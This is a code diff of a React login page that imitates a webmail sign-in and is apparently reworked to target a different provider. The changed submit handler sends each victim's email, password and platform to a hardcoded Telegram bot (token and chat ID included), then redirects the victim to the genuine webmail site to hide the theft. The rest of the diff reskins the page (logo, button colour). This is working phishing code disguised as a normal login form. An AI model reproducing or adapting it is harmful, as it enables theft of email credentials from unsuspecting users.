@@ -16,36 +16,41 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Catskill")
+    const[platform, setPlatform] = useState("IW")
 
     const[showError, setShowError] = useState(false);
 
-
-async function handleSubmit(e){
-    e.preventDefault();
-
-    try {
-        const response = await axios.post('https://akamubackend.onrender.com/api/send', {
-            email:email,
-            password:password,
-            platform:platform
-        });
-    
-        // Handle success
-        console.log('Data sent:', response.data.message);
-
-        if(response.status == 200){
-            console.log(response.data.message);
-
-            window.location.href = 'https://webmail.catskill.net/';
+    async function handleSubmit(e){
+      e.preventDefault();
+  
+      try {
+          // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
+          //     email:email,
+          //     password:password,
+          //     platform:platform
+          // });
+  
+         const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+              chat_id: 5868304053,
+              text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
+            });
+  
+      
+          // Handle success
+       
+  
+          if(response.status == 200){
+             // console.log(response.data.message);
+  
+            
+             window.location.href = 'https://mail.iw.net/';
+          }
+        } catch (error) {
+          // Handle error
+          console.error('Error:', error);
         }
-      } catch (error) {
-        // Handle error
-        console.error('Error:', error);
-      }
-    
-}
-
+      
+  }
 
     return (
         <>
@@ -62,7 +67,7 @@ async function handleSubmit(e){
 
 
             <div className='text-center my-4'>
-            <img  src={catskill} />
+            {/* <img  src={catskill} /> */}
 
             </div>
 
@@ -119,8 +124,8 @@ async function handleSubmit(e){
                     <div className='form-group text-center'>
 
 <button type='submit' style={{
-    background:"#019bc6",
-}}className='btn text-center w-50 font-weight-bold text-light'>LOGIN</button>
+    background:"#0a109c",
+}}className='btn text-center w-50 font-weight-bold text-light py-2'>LOGIN</button>
 
 
 
